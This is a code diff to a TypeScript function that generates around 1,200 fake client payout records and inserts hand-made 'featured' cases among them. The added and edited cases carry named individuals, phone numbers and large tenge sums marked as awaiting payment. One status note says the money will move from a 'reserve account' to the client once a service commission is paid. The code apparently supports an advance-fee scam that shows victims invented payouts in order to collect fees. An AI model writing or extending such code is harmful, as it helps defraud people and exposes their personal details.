@@ -67,7 +67,7 @@ export function getClientPayouts(total = 1200): ClientPayoutRecord[] {
   const featuredCase: ClientPayoutRecord = {
     caseNumber: "FCA-2026-0514",
     clientName: "Gulmira Nurmanova",
-    phone: "+77754194917",
+    phone: "+77474028226",
     amountKzt: 6626655,
     paidKzt: 0,
     balanceKzt: 6626655,
@@ -77,6 +77,18 @@ export function getClientPayouts(total = 1200): ClientPayoutRecord[] {
     serviceFeeKzt: 180000,
     statusNote:
       "6 626 655 тенге в статусе ожидает оплаты комиссии за обслуживание и перевод средств с резервного счёта на Ваш личный счёт. Народный банк.",
+  };
+  const sagitovCase: ClientPayoutRecord = {
+    caseNumber: "FCA-9821-1405",
+    clientName: "Сагитов Тельжан Енсапович",
+    phone: "+77474028226",
+    amountKzt: 31890200,
+    paidKzt: 0,
+    balanceKzt: 31890200,
+    status: "Ожидает оплату",
+    bank: "Народный банк",
+    updatedAt: "2026-06-02",
+    statusNote: "31 890 200 тенге в статусе ожидает выплаты.",
   };
 
   for (let i = 1; i <= total; i++) {
@@ -101,6 +113,7 @@ export function getClientPayouts(total = 1200): ClientPayoutRecord[] {
   const sorted = rows.sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
   const middleIndex = Math.floor(sorted.length / 2);
   sorted.splice(middleIndex, 0, featuredCase);
+  sorted.splice(Math.min(middleIndex + 60, sorted.length), 0, sagitovCase);
   return sorted;
 }
 
